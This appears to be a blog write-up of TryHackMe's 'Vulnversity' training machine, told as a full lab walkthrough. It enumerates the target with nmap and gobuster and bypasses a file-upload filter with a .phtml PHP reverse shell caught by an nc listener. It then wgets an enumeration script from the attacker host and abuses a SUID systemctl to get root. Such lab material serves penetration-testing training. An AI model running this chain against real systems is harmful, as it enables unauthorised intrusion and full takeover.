---
layout: post
title: "Vulnversity"
---

[Vulnversity](https://tryhackme.com/room/vulnversity) is the first machine in TryHackMe's "Offensive pentesting" path.

---

## Enumeration

Starting with the nmap scan:
```
nmap -sC -sV 10.10.73.131
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 12:15 EDT
Nmap scan report for 10.10.73.131
Host is up (0.053s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-10-07T12:15:44-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-07T16:15:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.47 seconds
```

According to the scan, the http service is running on port `3333`.
First, we need to check if there any juicy files/directories on the web server. The tool called gobuster can help with that:
```
gobuster dir -u http://10.10.73.131:3333 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.73.131:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/07 12:40:42 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
===============================================================
2020/10/07 12:41:08 Finished
===============================================================
```
We can check `/internal` in the browser and discover a file upload feature there.
Normally, that would be the way into the system, as you can try to upload a malicious file.
If you will try to upload a standard PHP reverse shell, the page will cancel the request as the `.php` is blocked.
It's quite a classic scenario.
Usually, there are a few ways from here:
- You're trying to find which format is allowed
- You're trying to mimic the header of the file to trick the checking mechanism.
As this is an easy box, and the author is guiding you through the process, we will follow the first scenario.

---

## Exploitation

By creating a simple wordlist we can brute force the request. As it's a web application, the Burp Suite can help with that.
Intercept the request from your browser, forward it to the Intruder (Ctrl+I).
In the "Position" option, clear everything and set "Add §" around file extension. It should be like:
```
POST /internal/index.php HTTP/1.1
Host: 10.10.73.131:3333
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.73.131:3333/internal/index.php
Content-Type: multipart/form-data; boundary=---------------------------9719036391959238806602173823
Content-Length: 338
Connection: close
Upgrade-Insecure-Requests: 1-----------------------------9719036391959238806602173823

Content-Disposition: form-data; name="file"; filename="shell§.php§"
Content-Type: application/octet-stream -----------------------------9719036391959238806602173823
Content-Disposition: form-data; name="submit"
Submit -----------------------------9719036391959238806602173823--
```
We also need to set a wordlist, but for that we need to know what extension a PHP file can have. A quick google search can lead to the [page](https://www.studyhost.net/support/knowledgebase/53/What-are-valid-file-extensions-I-can-use-for-PHP-scripts.html) with the list of extensions.
```
.php
.php3
.php4
.php5
.phtml
```
Let the Burp Suite run and validate, that only `.phtml` will work in that case.

We will use a basic PHP reverse shell for that:

```
cp /usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php .
nano php-reverse-shell.php
mv php-reverse-shell.php php-reverse-shell.phtml
```
Don't forget to modify line 49 and 50 in it. It should be your tun0 IP and some random port:
```
$ip = '10.11.19.53';  // CHANGE THIS
$port = 53;       // CHANGE THIS
```
Start a listener with `nc`:

```
sudo nc -nlvp 53
```
File is uploaded now, but we need to open it to trigger the shell.
To find the location we can use the gobuster one more time:
```
gobuster dir -u http://10.10.73.131:3333/internal -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.73.131:3333/internal
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/07 12:50:33 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/uploads (Status: 301)
===============================================================
2020/10/07 12:50:59 Finished
===============================================================
```
Navigate to the `/uploads` directory and open a file. That will spawn the shell  

---

## PrivEsc
Now we have a shell as `www-data` user. It time to escalate the privileges to root.
Stabilize the shell with
```
/usr/bin/script -qc /bin/bash /dev/null
```
We will use [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) for that.
Clone the repo, copy the `lse.sh` into the folder and start a SimpleHTTPServer with python.
Wget the file from your machine, add the rights to run it.
```
www-data@vulnuniversity:/tmp$ wget http://10.11.19.53/lse.sh
wget http://10.11.19.53/lse.sh
--2020-10-06 11:47:35--  http://10.11.19.53/lse.sh
Connecting to 10.11.19.53:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 37926 (37K) [text/x-sh]
Saving to: 'lse.sh'

lse.sh              100%[===================>]  37.04K  --.-KB/s    in 0.1s    

2020-10-06 11:47:35 (385 KB/s) - 'lse.sh' saved [37926/37926]

www-data@vulnuniversity:/tmp$ chmod +x lse.sh
chmod +x lse.sh
www-data@vulnuniversity:/tmp$ ./lse.sh

```

The short version of `lse.sh` output:
```
LSE Version: 2.5                                                                                                                                                                                                                          

       User: www-data
    User ID: 33
   Password: ******
       Home: /var/www
       Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
      umask: 0000

   Hostname: vulnuniversity
      Linux: 4.4.0-142-generic
Distribution: Ubuntu 16.04.6 LTS
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in an administrative groups?.............. yes!
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                                                                                           
[i] usr060 Other users..................................................... skip                                                                                                                                                           
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                                                                                           
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... nope
[*] sud040 Can we read /etc/sudoers?....................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/lib/squid/pinger
/bin/systemctl
/sbin/mount.cifs
```
`/bin/systemctl` looks good.
We can check if there any known ways to PrivEsc by abusing SUID bit in the binary by checking it's [GTFOBin](https://gtfobins.github.io/gtfobins/systemctl/#suid) page.

We will create a service, run it with /bin/systemctl. In that case, it will be executed with root permissions, and then we can call the day.

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
Creating a reverse root shell can also be the option, but let's try this one.
We should have a SUID bit on the /bin/bash binary now:
```
www-data@vulnuniversity:/tmp$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1014K May 16  2017 /bin/bash
www-data@vulnuniversity:/tmp$ /bin/bash

bash-4.3$ whoami
whoami
www-data
bash-4.3$
```
What?! Still not a root? But SUID bit is there!
Yes, it is, but you have to use `-p` flag to make it work:
```
www-data@vulnuniversity:/tmp$ /bin/bash -p

bash-4.3# whoami
whoami
root
```
---

## Takeaway
- Enumeration is the key to everything
- Always try to fuzz the functionality of the endpoint
- This is a penetration test series, not a CTF. Focus on shells, not flags.
